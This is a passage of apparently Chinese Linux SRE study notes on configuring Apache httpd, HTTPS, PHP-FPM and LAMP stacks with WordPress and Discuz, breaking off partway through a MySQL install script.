PrivateTmp=true
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now httpd
}

install_httpd
```

![1654508978791](linuxSRE.assets/1654508978791.png)

### 36.5Httpd的常见配置

```
#0.关闭httpd -t报错提示
root@centos8 ~]# vim /etc/httpd/conf/httpd.conf
#把第203行取消注释
ServerName www.example.com:80




#1.多端口开启以及安全保护
[root@centos8 ~]# vim /etc/httpd/conf.d/test.conf
listen 8080   #子配置文件再开8080端口
ServerTokens prod  #隐藏版本号
[root@centos8 ~]# systemctl restart httpd



#2.持久连接
连接建立，每个资源获取完成后不会断开连接，而是继续等待其它的请求完成，默认开启持久连接
[root@centos8 ~]# vim /etc/httpd/conf.d/test.conf
KeepAliveTimeout  15      #连接持续15s,可以以ms为单位,默认值为5s
MaxKeepAliveRequests 500  #持久连接最大接收的请求数,默认值100



#3.DSO (Dynamic Shared Object)
Dynamic Shared Object，加载动态模块配置，不需重启即生效
动态模块所在路径： /usr/lib64/httpd/modules/
主配置 /etc/httpd/conf/httpd.conf 文件中指定加载模块配置文件

[root@centos8 ~]# httpd -M #查看被加载的模块
[root@centos8 ~]# vim /etc/httpd/conf.modules.d/00-base.conf
里面都是被加载的模块，只要给他们添加注释就不会被加载
LoadModule access_compat_module modules/mod_access_compat.so
#LoadModule actions_module modules/mod_actions.so
LoadModule alias_module modules/mod_alias.so



#4. MPM (Multi-Processing Module) 多路处理模块
修改mpm工作模式，只能选择一个
[root@centos8 ~]# vim /etc/httpd/conf.modules.d/00-mpm.conf
#LoadModule mpm_prefork_module modules/mod_mpm_prefork.so 取消注释即可



#5.prefork模式相关的配置
StartServers       100
MinSpareServers   50
MaxSpareServers   80
ServerLimit     2560 #最多进程数,最大值 20000
MaxRequestWorkers    2560 #最大的并发连接数，默认256
MaxConnectionsPerChild  4000 #子进程最多能处理的请求数量。在处理MaxRequestsPerChild 个
请求之后,子进程将会被父进程终止，这时候子进程占用的内存就会释放(为0时永远不释放）
MaxRequestsPerChild 4000  #从 httpd.2.3.9开始被MaxConnectionsPerChild代替



#6.worker和event模式相关的配置
ServerLimit         16  #最多worker进程数 Upper limit on configurable number of 
processes
StartServers        10  #Number of child server processes created at startup
MaxRequestWorkers  150  #Maximum number of connections that will be processed 
simultaneously
MinSpareThreads     25
MaxSpareThreads     75
ThreadsPerChild     25  #Number of threads created by each child process




#7.定义Main server的文档页面路径
[root@centos8 ~]# vim /etc/httpd/conf/httpd.conf
DocumentRoot +你定义的路径
DocumentRoot "/data/html"

[root@centos8 conf.d]# pwd
/etc/httpd/conf.d
[root@centos8 conf.d]# mv welcome.conf welcome.conf.bak #为了显示Options indexes做的铺垫
[root@centos8 conf.d]# systemctl restart httpd


[root@centos8 ~]# vim /etc/httpd/conf.d/test.conf
在子配置文件完成授权
<directory /你定义的路径>
 Require all granted
</directory>

#案例：
[root@centos8 html]# vim /etc/httpd/conf.d/test.conf
ServerTokens prod
<directory /data/html>
    Require all granted #所有的全部授权
    Options Indexes FollowSymLinks  #列出当前文件下的所有文件列表
</directory>



#8.AllowOverride指令
与访问控制相关的哪些指令可以放在指定目录下的.htaccess（由AccessFileName 指令指定,AccessFileName .htaccess 为默认值）文件中，覆盖之前的配置指令，只对语句有效

AllowOverride All: .htaccess中所有指令都有效
AllowOverride None： .htaccess 文件无效，此为httpd 2.3.9以后版的默认值
AllowOverride AuthConfig .htaccess 文件中，除了AuthConfig 其它指令都无法生效


#放到.htaccess隐藏文件下
[root@centos8 html]# pwd
/data/html
[root@centos8 html]# cat .htaccess
Options Indexes FollowSymLinks

#子配置文件加 AllowOverride All
[root@centos8 html]# vim /etc/httpd/conf.d/test.conf
ServerTokens prod
<directory /data/html>
    Require all granted
    AllowOverride All
</directory>
[root@centos8 conf.d]# systemctl restart httpd



#9.基于客户端IP地址实现访问控制
[root@centos8 html]# vim /etc/httpd/conf.d/test.conf
ServerTokens prod
<directory /data/html>
    <requireAny>
    require all denied
    Require ip 10.0.0.0             
    </requireAny>
    <RequireAll>
    Require all granted
    Require not ip 10.0.0.57 #拒绝特定IP
    require ip  172.16.1.1  #允许特定IP
    </RequireAll>
    AllowOverride All
</directory>


 
#10.日志设定
httpd有两种日志类型
访问日志
错误日志

#10.1错误日志
[root@centos8 ~]# tail -f /var/log/httpd/error_log #查看错误日志

#10.2访问日志
[root@centos8 html]# tail -f /var/log/httpd/access_log 

范例: 通过自定义访问日志格式,实现自定义时间格式
[root@centos8 ~]#vim /etc/httpd/conf/httpd.conf
第200行自定义日期格式
logFormat "%h \"%{%F %T}t\" %>s %{User-Agent}i" testlog
第222行注释掉然后再指定自定义格式
CustomLog "logs/access_log" testlog
[root@centos8 conf.d]# systemctl restart httpd

#最后格式是如下：
10.0.0.7 "2022-06-07 16:00:50" 200 curl/7.29.0



#11.基于用户账号进行认证
#创建基于用户账号进行认证的文件夹
[root@centos8 html]# mkdir admin
root@centos8 html]# echo /data/html/admin/index.html > admin/index.html


#创建账号密码
[root@centos8 html]# cd /etc/httpd/conf.d/
[root@centos8 conf.d]# htpasswd -b .httpuser xiaoming 123456
[root@centos8 conf.d]# htpasswd -b .httpuser xiaohong 123456
[root@centos8 conf.d]# cat .httpuser
xiaoming:$apr1$YVH.HR5m$MXRPccm2Adav3WjYpXNUb1
xiaohong:$apr1$xdcxhGOd$KqH8M42.UWEkMGpt9Eltr.


#修改配置
[root@centos8 conf.d]# vim /etc/httpd/conf.d/test.conf
ServerTokens prod
<directory /data/html>
    Require all granted
</directory>

<directory /data/html/admin>
    AuthType Basic
    AuthName "liusenbiao's warning"
    AuthUserFile "/etc/httpd/conf.d/.httpuser"
    Require  valid-user
</directory>
[root@centos8 conf.d]# systemctl restart httpd




#12.status状态页
httpd 提供了状态页可以用来观察httpd的运行情况。此功能需要加载mod_status.so模块才能实现

#12.1开启状态页功能
[root@centos8 conf.d]# httpd -M | grep status
 status_module (shared)
[root@centos8 conf.d]# vim /etc/httpd/conf.d/test.conf
<Location "/apache_status">
SetHandler server-status
    AuthType Basic
    AuthName "liusenbiao's warning"
    AuthUserFile "/etc/httpd/conf.d/.httpuser"
    Require user xiaoming #只允许xiaoming访问
</Location>
[root@centos8 conf.d]# systemctl restart httpd
浏览器输入：http://10.0.0.8/apache_status




#13.多虚拟主机
httpd 支持在一台物理主机上实现多个网站，即多虚拟主机
多虚拟主机有三种实现方案：
基于ip：为每个虚拟主机准备至少一个ip地址
基于port：为每个虚拟主机使用至少一个独立的port
基于FQDN：为每个虚拟主机使用至少一个FQDN，请求报文中首部 Host: www.magedu.com



#案例：搭建3个网站
#13.1创建三个网站的目录和网页
[root@centos8 ~]# cd /data/
[root@centos8 data]# ls
html
[root@centos8 data]# echo www.a.com on website1 > website1/index.html
[root@centos8 data]# echo www.b.com on website2 > website2/index.html
[root@centos8 data]# echo www.c.com on website3 > website3/index.html
[root@centos8 data]# tree
.
├── html
│   ├── admin
│   │   └── index.html
│   ├── a.txt -> /etc/fstab
│   ├── dir1
│   ├── download
│   │   └── Xshell.exe
│   ├── index.html
│   └── news
│       └── news.html
├── website1
│   └── index.html
├── website2
│   └── index.html
└── website3
    └── index.html

8 directories, 8 files


#13.2基于ip地址实现
#创建三个网站对应的ip地址(不推荐)
因为需要配三个公网ip，成本太大！
[root@centos8 data]# ip a a 10.0.0.101/24 dev eth0 label eth0:1
[root@centos8 data]# ip a a 10.0.0.102/24 dev eth0 label eth0:2
[root@centos8 data]# ip a a 10.0.0.103/24 dev eth0 label eth0:3

#创建对应的配置文件
[root@centos8 data]# vim /etc/httpd/conf.d/test.conf

<virtualhost 10.0.0.101:80>
documentroot /data/website1
<directory /data/website1>
    Require all granted
</directory>
</virtualhost>

<virtualhost 10.0.0.102:80>
documentroot /data/website2
<directory /data/website2>
    Require all granted
</directory>
</virtualhost>

<virtualhost 10.0.0.103:80>
documentroot /data/website3
<directory /data/website3>
    Require all granted
</directory>
</virtualhost>
systemctl restart httpd




基于port实现(不推荐)
一般人懒得敲端口号！！！！
[root@centos8 data]# nmcli connection up eth0
[root@centos8 data]# vim /etc/httpd/conf.d/test.conf 
listen 81
listen 82
listen 83

<virtualhost *:81>
documentroot /data/website1
<directory /data/website1>
    Require all granted
</directory>
</virtualhost>

<virtualhost *:82>
documentroot /data/website2
<directory /data/website2>
    Require all granted
</directory>
</virtualhost>

<virtualhost *:83>
documentroot /data/website3
<directory /data/website3>
    Require all granted
</directory>
</virtualhost>




基于FQDN(域名解析)：推荐：生产中用的最多
centos7的配置host文件
[18:06:20 root@centos7 ~]#vim /etc/hosts
10.0.0.8 www.a.com www.b.com www.c.com

#完成了centos8配置以后测试
[20:55:01 root@centos7 ~]#curl www.c.com
www.c.com on website3
[21:02:10 root@centos7 ~]#curl www.b.com
www.b.com on website2
[21:02:14 root@centos7 ~]#curl www.a.com
www.a.com on website1


#centos8配置
[root@centos8 data]# vim /etc/httpd/conf.d/test.conf 
<virtualhost *:80>
servername www.a.com
documentroot /data/website1
<directory /data/website1>
    Require all granted
</directory>
</virtualhost>

<virtualhost *:80>
servername www.b.com
documentroot /data/website2
<directory /data/website2>
    Require all granted
</directory>
</virtualhost>

<virtualhost *:80>
servername www.c.com
documentroot /data/website3
<directory /data/website3>
    Require all granted
</directory>
</virtualhost>
[root@centos8 data]# systemctl restart httpd




#14.压缩
适用场景：
(1) 节约带宽，额外消耗CPU；同时，可能有些较老浏览器不支持
(2) 压缩适于压缩的资源，例如文本文件

#14.1压缩指令
#可选项
SetOutputFilter DEFLATE  
# 指定对哪种MIME类型进行压缩，必须指定项
AddOutputFilterByType DEFLATE text/plain 
AddOutputFilterByType DEFLATE text/html
AddOutputFilterByType DEFLATE application/xhtml+xml
AddOutputFilterByType DEFLATE text/xml
AddOutputFilterByType DEFLATE application/xml
AddOutputFilterByType DEFLATE application/x-javascript
AddOutputFilterByType DEFLATE text/javascript
AddOutputFilterByType DEFLATE text/css
#压缩级别 (Highest 9 - Lowest 1)
DeflateCompressionLevel 9 #排除特定旧版本的浏览器，不支持压缩
#Netscape 4.x 只压缩text/html
BrowserMatch ^Mozilla/4 gzip-only-text/html
#Netscape 4.06-08 三个版本 不压缩
BrowserMatch ^Mozilla/4\.0[678] no-gzip
#Internet Explorer标识本身为"Mozilla / 4”，但实际上是能够处理请求的压缩。如果用户代理首部
匹配字符串"MSIE”（"B”为单词边界”），就关闭之前定义的限制
BrowserMatch \bMSI[E] !no-gzip !gzip-only-text/html



#14.2开启压缩功能
[root@centos8 data]# vim /etc/httpd/conf.d/test.conf
<virtualhost *:80>
servername www.a.com
documentroot /data/website1
<directory /data/website1>
    Require all granted
</directory>
AddOutputFilterByType DEFLATE text/plain
AddOutputFilterByType DEFLATE text/html
DeflateCompressionLevel 9
</virtualhost>
```

### 36.6实现https

#### 36.6.1 HTTPS 会话的简化过程

![1654609829565](linuxSRE.assets/1654609829565.png)

#### 36.6.2生成自签名证书

```
[root@centos8 ~]#yum -y install   mod_ssl
[root@centos7 ~]#cd /etc/pki/tls/certs
[root@centos7 certs]#pwd
/etc/pki/tls/certs
[root@centos7 certs]#ls 
ca-bundle.crt ca-bundle.trust.crt make-dummy-cert Makefile renew-dummy-cert
[root@centos7 certs]#vim Makefile 
#/usr/bin/openssl genrsa -aes128 $(KEYLEN) > $@
/usr/bin/openssl genrsa  $(KEYLEN) > $@    
[root@centos7 certs]#make magedu.org.crt
umask 77 ; \
#/usr/bin/openssl genrsa -aes128 2048 > magedu.org.key
/usr/bin/openssl genrsa  2048 > magedu.org.key
Generating RSA private key, 2048 bit long modulus
......................+++
...+++
e is 65537 (0x10001)
umask 77 ; \
/usr/bin/openssl req -utf8 -new -key magedu.org.key -x509 -days 365 -out
magedu.org.crt 
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]:CN
State or Province Name (full name) []:beijing
Locality Name (eg, city) [Default City]:beijing
Organization Name (eg, company) [Default Company Ltd]:magedu
Organizational Unit Name (eg, section) []:devops
Common Name (eg, your name or your server's hostname) []:www.magedu.org
Email Address []:
[root@centos7 certs]#ls
ca-bundle.crt ca-bundle.trust.crt magedu.org.crt magedu.org.key make-dummycert Makefile renew-dummy-cert
```

#### 36.6.3互联网网站证书实现

```
[root@centos8 ~]#dnf -y install   mod_ssl
[root@centos8 ~]#ll /etc/httpd/conf.d/ssl/
total 24
-rw-r--r-- 1 root root 1679 Dec 10  2019 www.wangxiaochun.com_chain.crt
-rw-r--r-- 1 root root 1675 Dec 10  2019 www.wangxiaochun.com.key
-rw-r--r-- 1 root root 2021 Dec 10  2019 www.wangxiaochun.com_public.crt
[root@centos8 ~]#cd /etc/httpd/conf.d/ssl/
[root@centos8 ssl]#openssl x509 -in www.wangxiaochun.com_public.crt -noout -text
[root@centos8 ~]#grep -Ev "^ *#|^$" /etc/httpd/conf.d/ssl.conf
```

#### 36.6.4URL重定向

```
#0.status状态：
permanent： 返回永久重定向状态码 301,此重定向信息进行缓存
temp：返回临时重定向状态码302. 此为默认值


范例:
[root@centos8 ~]# vim /etc/httpd/conf.d/test.conf
Redirect permanent / https://www.magedu.com/


#1.http实现重定向https
[root@centos8 ~]# vim /etc/httpd/conf.d/test.conf
RewirteEngine on
RewriteRule ^(/.*)$ https://%{HTTP_HOST}$1 [redirect=301]
```

![1654611390915](linuxSRE.assets/1654611390915.png)

### 36.7http协议及报文头部结构

#### 36.7.1HTTP请求报文

![1654613417067](linuxSRE.assets/1654613417067.png)

#### 36.7.2HTTP响应报文

![1654613818218](linuxSRE.assets/1654613818218.png)

#### 36.7.3HTTP报文格式

```
#0.Method方法
请求方法，标明客户端希望服务器对资源执行的动作，包括以下：
GET： 从服务器获取一个资源
HEAD： 只从服务器获取文档的响应首部
POST： 向服务器输入数据，通常会再由网关程序继续处理
PUT： 将请求的主体部分存储在服务器中，如上传文件
DELETE： 请求删除服务器上指定的文档
TRACE：追踪请求到达服务器中间经过的代理服务器
OPTIONS：请求服务器返回对指定资源支持使用的请求方法
CONNECT：建立一个到由目标资源标识的服务器的隧道
PATCH：用于对资源应用部分修改




#1.http协议状态码分类
1xx：100-101 信息提示
2xx：200-206 成功
3xx：300-307 重定向
4xx：400-415 错误类信息，客户端错误
5xx：500-505 错误类信息，服务器端错误


#1.1http协议常用的状态码
200： 成功，请求数据通过响应报文的entity-body部分送;OK
301： 请求的URL指向的资源已经被删除；但在响应报文中通过首部Location指明了资源现在所处的新位置；Moved Permanently
302： 响应报文Location指明资源临时新位置 Moved Temporarily
304： 访问浏览器页面，服务器已经把资源给你了，下次直接走缓存，没必要直接再次申请资源，提高了效率
307: 浏览器自身内部做跳转
401： 需要输入账号和密码认证方能访问资源；Unauthorized
403： 请求被禁止；Forbidden
404： 服务器无法找到客户端请求的资源；Not Found
500： 服务器内部错误；Internal Server Error
502： 代理服务器无法转发请求到真正的网站上，返回Bad Gateway
503： 服务不可用，临时服务器维护或过载，服务器无法处理请求
504： 网关超时
```

#### 36.7.4cookie获取过程

![1654617637926](linuxSRE.assets/1654617637926.png)

```
#第一次请求过程
浏览器第一次发送请求时，不会携带任何cookie信息
服务器接收到请求之后，发现请求中没有任何cookie信息
服务器生成和设置一个cookie.并将此cookie设置通过set_cookie的首部字段保存在响应报文中返回给浏览器浏览器接收到这个响应报文之后，发现里面有cookie信息，浏览器会将cookie信息保存起来

#第二次及其之后的过程
当浏览器第二次及其之后的请求报文中自动cookie的首部字段携带第一次响应报文中获取的cookie信息服务器再次接收到请求之后，会发现请求中携带的cookie信息，这样的话就认识是谁发的请求了之后的响应报文中不会再添加set_cookie首部字段
```

#### 36.7.5session获取过程

![1654618846812](linuxSRE.assets/1654618846812.png)

```
session的工作流程第一次请求:
浏览器发起第一次请求的时候可以携带一些信息(比如:用户名/家码)cookie中没有任何信息。
当服务器接收到这个请求之后，进行用户名和密码的验证，验证成功后则可以设置session信息。
在设置session信息的同时(session信息保存在服务器端)服务器会在响应头中设置一个随机的sessionid的cookie信息
客户端(浏览器)在接收到响应之后，会将cookie信息保存起来(保存sessionid的信息)

第二次及其之后的请求:
第二次及其之后的请求都会携带sessionid信息
当服务器接收到这个请求之后，会获取到sessionid信息，然后进行验证
验证成功，则可以获取session信息(session信息保存在服务器端
```

#### 36.7.6cookie和session比较

```
#cookie和session的相同和不同
1.cookie通常是在服务器生成,但也可以在客户端生成,session是在服务器端生成的
2.session将数据信息保存在服务器端，可以是内存，文件，数据库等多种形式,cookie将数据保存在客户端的内存或文件中
3.单个cookie保存的数据不能超过4K，每个站点cookie个数有限制，比如IE8为50个、Firefox为50个、Opera为30个；session存储在服务器，没有容量限制
4.cookie存放在用户本地，可以被轻松访问和修改，安全性不高；session存储于服务器，比较安全
5.cookie有会话cookie和持久cookie，生命周期为浏览器会话期的会话cookie保存在缓存，关闭浏览器窗口就消失，持久cookie被保存在硬盘，知道超过设定的过期时间；随着服务端session存储压力增大，会根据需要定期清理session数据
6.session中有众多数据，只将sessionID这一项可以通过cookie发送至客户端进行保留，客户端下次访问时，在请求报文中的cookie会自动携带sessionID，从而和服务器上的的session进行关联




cookie缺点：
1、使用cookie来传递信息，随着cookie个数的增多和访问量的增加，它占用的网络带宽也很大，试想假如cookie占用200字节，如果一天的PV有几个亿，那么它要占用多少带宽？
2、cookie并不安全，因为cookie是存放在客户端的，所以这些cookie可以被访问到，设置可以通过插件添加、修改cookie。所以从这个角度来说，我们要使用sesssion，session是将数据保存在服务端的，只是通过cookie传递一个sessionId而已，所以session更适合存储用户隐私和重要的数据
session 缺点：
1、不容易在多台服务器之间共享，可以使用session绑定，session复制，session共享解决
2、session存放在服务器中，所以session如果太多会非常消耗服务器的性能
```

## 37.LAMP架构

### 37.1LAMP架构组成

L(N)AMP： 

L：linux

N:  Nginx

A：apache (httpd)

M：mysql, mariadb

P：php, perl, python

![1654657903476](linuxSRE.assets/1654657903476.png)

### 37.2 CGI和fastcgi

```
#1.CGI
CGI：Common Gateway Interface 公共网关接口
CGI 在2000年或更早的时候用得比较多，以前web服务器一般只处理静态的请求，如果碰到一个动态请求怎么办呢？web服务器会根据这次请求的内容，然后会 fork一个新进程来运行外部的 C 程序或者bash,perl脚本等，这个进程会把处理完的数据返回给web服务器，最后web服务器把内容发送给用户，刚才fork的进程也随之退出。 如果下次用户还请求改动态脚本，那么web服务器又再次fork一个新进程，周而复始的进行。
CGI不停的创建进程和销毁进程，效率很差故逐渐被淘汰！！！

请求流程：
Client -- (http协议) --> httpd -- (cgi协议) --> application server (program file) -- (mysql协议) --> mysql




#2.fastcgi
fastcgi的方式是，web服务器收到一个请求时，不会重新fork一个进程（因为这个进程在web服务器启动时就开启了，而且不会退出），web服务器直接把内容传递给这个进程（进程间通信，但fastcgi使用了别的方式，tcp方式通信），这个进程收到请求后进行处理，把结果返回给web服务器，最后自己接着等待下一个请求的到来，而不是退出


请求流程：
Client -- (http协议) --> httpd -- (fastcgi协议) --> fastcgi服务器 -- (mysql协议) --> mysql
```

### 37.3CGI和fastcgi比较

![1654659099513](linuxSRE.assets/1654659099513.png)

### 37.4PHP的环境配置

```
#0.PHP的编译步骤：
Opcode是一种PHP脚本编译后的中间语言，类似于Java的ByteCode,或者.NET的MSL

PHP的语言引擎Zend执行PHP脚本代码一般会经过如下4个步骤
1、Scanning 词法分析,将PHP代码转换为语言片段(Tokens)
2、Parsing 语义分析,将Tokens转换成简单而有意义的表达式
3、Compilation 将表达式编译成Opcode
4、Execution 顺次执行Opcode，每次一条，从而实现PHP脚本的功能
即：扫描-->分析-->编译-->执行




#1.php常见设置：
expose_php = On   #响应报文显示首部字段x-powered-by: PHP/x.y.z，暴露php版本，建议为off 
max_execution_time= 30 #最长执行时间30s
memory_limit=128M #生产不够，可调大
display_errors=off  #调试使用，不要打开，否则可能暴露重要信息
display_startup_errors=off  #建议关闭
post_max_size=8M   #最大上传数据大小，生产可能调大，比下面项大
upload_max_filesize =2M  #最大上传文件，生产可能要调大
max_file_uploads = 20 #同时上传最多文件数
date.timezone =Asia/Shanghai  #指定时区
short_open_tag=on #开启短标签,如: <? phpinfo();?>



#2.搭建LAMP环境检查
[root@centos8 ~]# yum -y install httpd php
[root@centos8 ~]# sed -i 's/;date.timezone =/date.timezone =Asia\/Shanghai/' /etc/php.ini
[root@centos8 ~]# vim /var/www/html/info.php
<?php
 echo date("Y/m/d H:i:s");
 phpinfo();
?>
[root@centos8 ~]# systemctl restart php-fpm httpd
浏览器上输入10.0.0.8/info.php出现页面则表示测试成功！！
```

![1654678792892](linuxSRE.assets/1654678792892.png)

### 37.5实现LAMP

#### 37.5.1PHP连接mysql

```
#0.安装对应的包
#centos8
[root@centos8 ~]# yum -y install php-mysqlnd php httpd mysql-server
#centos7
[root@centos7 ~]# yum -y install php-mysql php httpd mysql-server
[root@centos8 ~]# find /lib64/ -name mysqli.so
/lib64/php/modules/mysqli.so




#1.使用PDO(PHP Data Object)扩展连接数据库
使用PDO扩展模块pdo_mysql.so连接数据库，此方式可以支持连接MySQL，Oracle等多种数据库

#1.1检查LAMP是否安装完毕
[root@centos8 ~]# systemctl enable --now mysqld
[root@centos8 ~]# rpm -q mysql-server httpd php php-mysqlnd
mysql-server-8.0.17-3.module_el8.0.0+181+899d6349.x86_64
httpd-2.4.37-21.module_el8.2.0+382+15b0afa8.x86_64
php-7.2.24-1.module_el8.2.0+313+b04d0a66.x86_64
php-mysqlnd-7.2.24-1.module_el8.2.0+313+b04d0a66.x86_64


#1.2编写php测试连接代码
[root@centos8 ~]# cd /var/www/html/
[root@centos8 html]# vim lamp.php
<?php
try {
$user='root';
$pass='';
$dbh = new PDO('mysql:host=localhost;port=3306;dbname=mysql', $user, $pass);
foreach($dbh->query('SELECT user,host from user') as $row) {
print_r($row);
}
$dbh = null;
} catch (PDOException $e) {
print "Error!: " . $e->getMessage() . "<br/>";
die();
}
?>
[root@centos8 ~]# systemctl restart php-fpm httpd mysqld
```

#### 37.5.2phpMyadmin

```
#1.下载源码包
[root@centos8 ~]# wget https://files.phpmyadmin.net/phpMyAdmin/5.2.0/phpMyAdmin-5.2.0-all-languages.zip
[root@centos8 ~]# unzip phpMyAdmin-5.2.0-all-languages.zip 
[root@centos8 ~]# mv phpMyAdmin-5.2.0-all-languages /var/www/html/pam
[root@centos8 ~]# yum -y install php-json php-xml




#2.开启php错误日志
[root@centos8 ~]# sed -i 's/;error_log = php_errors.log/error_log =\/var\/log\/php-fpm\/php_errors.log/' /etc/php.ini
[root@centos8 ~]# grep -n error_log /etc/php.ini
584:error_log =/var/log/php-fpm/php_errors.log
[root@centos8 ~]# systemctl restart php-fpm


#3.设置mysql的密码
[root@centos8 ~]# mysqladmin password 123456
```

![1654689921901](linuxSRE.assets/1654689921901.png)

![1654689980025](linuxSRE.assets/1654689980025.png)

#### 37.5.3wordpress搭建

```
#1.下载wordpress源码
[root@centos8 ~]# wget https://cn.wordpress.org/latest-zh_CN.tar.gz
[root@centos8 ~]# tar xf latest-zh_CN.tar.gz
[root@centos8 ~]# mv wordpress/ blog/
[root@centos8 ~]# mv blog /var/www/html/




#2.允许appache对数据库进行写操作
[root@centos8 ~]# chown -R apache.apache /var/www/html/
浏览器上输入http://10.0.0.8/blog/




#3.修改最大上传文件大小
[root@centos8 ~]# grep 2M /etc/php.ini 
upload_max_filesize = 2M
[root@centos8 ~]# sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php.ini
[root@centos8 ~]# grep 20M /etc/php.ini 
upload_max_filesize = 20M
[root@centos8 ~]# sed -i 's/post_max_size = 8M/post_max_size = 80M/' /etc/php.ini 
[root@centos8 ~]# grep 80M /etc/php.ini 
post_max_size = 80M
[root@centos8 ~]# systemctl restart php-fpm
```

![1654691141063](linuxSRE.assets/1654691141063.png)

#### 37.5.4Discuz论坛搭建

```
#1.下载源码包
[root@centos8 ~]# wget https://www.discuz.net/files/DiscuzX/3.4/Discuz_X3.4_SC_UTF8_20220518.zip
[root@centos8 ~]# unzip Discuz_X3.4_SC_UTF8_20220518.zip 
[root@centos8 ~]# mv upload/ /var/www/html/forum



#2.设置apache权限
[root@centos8 ~]# chown -R apache.apache /var/www/html/forum
```

![1654692080297](linuxSRE.assets/1654692080297.png)

![1654692195900](linuxSRE.assets/1654692195900.png)

![1654692476347](linuxSRE.assets/1654692476347.png)

![1654692509549](linuxSRE.assets/1654692509549.png)

![1654692963222](linuxSRE.assets/1654692963222.png)

![1654692991685](linuxSRE.assets/1654692991685.png)

![1654693200983](linuxSRE.assets/1654693200983.png)

#### 37.5.5opcache加速php

```
#centos8安装下包直接加速成功
[root@centos8 ~]# dnf install php-opcache -y


#centos7清华大学yum源安装最新版php
[09:53:57 root@centos7 ~]#wget https://mirrors.tuna.tsinghua.edu.cn/remi/enterprise/remi-release-7.rpm --no-check-certificate
[09:55:37 root@centos7 ~]#yum -y install remi-release-7.rpm php74-php-fpm php74-php-mysqlnd
```

#### 37.5.6基于FASTCGI的LAMP架构

```
0.#配置apche让接收到的php请求发送到fastcgi-server
[10:36:19 root@centos7 ~]# mkdir /data/html
[10:36:28 root@centos7 ~]# vim /data/html/test.php
<?php
 echo date("Y/m/d H:i:s");
 phpinfo();
?>


#1.指向fastcgi-server
[10:27:49 root@centos7 ~]#vim /etc/httpd/conf.d/test.conf
DirectoryIndex index.php
ProxyRequests Off  #启用反向代理
ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/data/html/$1 #$1后向引用，前面访问的如果是a.php，就去/data/html/下找a.php
ProxyPassMatch ^/(php_status|ping) fcgi://127.0.0.1:9000
[10:41:19 root@centos7 ~]#systemctl restart httpd



#2.多主机访问
[10:44:57 root@centos7 ~]#vim /etc/opt/remi/php74/php-fpm.d/www.conf 
38 listen = 127.0.0.1:9000
64 listen.allowed_clients = 127.0.0.1
252 ping.path = /ping
257 ping.response = liu pong
240 pm.status_path = /php_status
```

![1654744727468](linuxSRE.assets/1654744727468.png)

测试status状态页

![1654745024409](linuxSRE.assets/1654745024409.png)

测试ping

![1654744850885](linuxSRE.assets/1654744850885.png)

### 37.6综合实战

#### 37.6.1普通安装基于FASTCGI模式LAMP架构分离WEB应用

![1654745746127](linuxSRE.assets/1654745746127.png)

```
#0.目标
CentOS 7利用清华yum源，安装php7.4+wordpress5.4.2+opcache+event模式



#1.环境准备
三台主机：10.0.0.7：apache httpd
10.0.0.17:php
10.0.0.27:mysql
```

**10.0.0.7**:

```
[11:49:40 root@centos7 ~]#yum -y install httpd
[11:17:56 root@centos7 ~]#vim /etc/httpd/conf.d/test.conf
DirectoryIndex index.php
ProxyRequests Off  
ProxyPassMatch ^/(.*\.php)$ fcgi://10.0.0.17:9000/data/html/$1
ProxyPassMatch ^/(php_status|ping) fcgi://10.0.0.17:9000
[13:48:04 root@centos7 ~]#systemctl enable --now httpd
在浏览器上输入10.0.0.7/info.php查看结果
```

![1654755026628](linuxSRE.assets/1654755026628.png)

**10.0.0.17:**

```
[root@pxc2 ~]# yum -y install php-fpm php-mysql
[root@pxc2 ~]# vim /etc/php-fpm.d/www.conf
12 listen = 0.0.0.0:9000
24 ;listen.allowed_clients = 127.0.0.1
133 ping.path = /ping
121 pm.status_path = /php_status
[root@pxc2 ~]# systemctl enable --now php-fpm

[root@pxc2 ~]# mkdir /data/html
[root@pxc2 ~]# vim /data/html/info.php
<?php
 echo date("Y/m/d H:i:s");
 phpinfo();
?>

#测试数据库的连接
[root@pxc2 ~]# vim /data/html/mysql.php
<?php
try {
$user='root';
$pass='123456';
$dbh = new PDO('mysql:host=10.0.0.27;port=3306;dbname=mysql', $user, $pass);
foreach($dbh->query('SELECT user,host from user') as $row) {
print_r($row);
}
$dbh = null;
} catch (PDOException $e) {
print "Error!: " . $e->getMessage() . "<br/>";
die();
}
?>
在浏览器上输入http://10.0.0.7/mysql.php测试连接
```

![1654755772868](linuxSRE.assets/1654755772868.png)

**10.0.0.27**:

```
[root@pxc3 ~]# yum -y install mariadb-server
[root@pxc3 ~]# systemctl enable --now mariadb
MariaDB [(none)]> grant all on *.* to root@'10.0.0.%' identified by '123456';

```

#### 37.6.2编译安装基于FASTCGI模式LAMP架构多虚拟主机WEB应用

![1654745746127](linuxSRE.assets/1654745746127.png)

```
#0.目标
实现CentOS 7编译安装基于fastcgi模式的多虚拟主机wordpress和discuz的LAMP架构


 
1.四台主机
windows完成客户端用hosts文件做域名解析
10.0.0.8：数据库服务
10.0.0.7：wordpress和discuz
10.0.0.17：fastcgi-server
```

##### 37.6.2.1windows相关配置

第一步：修改权限

![1654772432853](linuxSRE.assets/1654772432853.png)

第二步：host域名解析

![1654772356860](linuxSRE.assets/1654772356860.png)

第三步：测试能不能ping通

![1654772495675](linuxSRE.assets/1654772495675.png)

```
#0.准备对应的包
[19:07:29 root@centos7 ~]# wget https://cn.wordpress.org/latest-zh_CN.tar.gz #wordpress源代码
[19:07:29 root@centos7 ~]# wget https://www.discuz.net/files/DiscuzX/3.4/Discuz_X3.4_SC_UTF8_20220518.zip #discuz源代码
[19:40:13 root@centos7 ~]# wget https://www.php.net/distributions/php-7.4.19.tar.gz
```

##### 37.6.2.2二进制安装mysql

```
#在线安装MySQL5.7和MySQL8.0
###################################################################
# File Name: install_mysql5.7or8.0_offline.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash
. /etc/init.d/functions
SRC_DIR=`pwd`
#MYSQL='mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz'
MYSQL='mysql-8.0.27-linux-glibc2.12-x86_64.tar.xz'
URL=http://mirrors.163.com/mysql/Downloads/MySQL-5.7
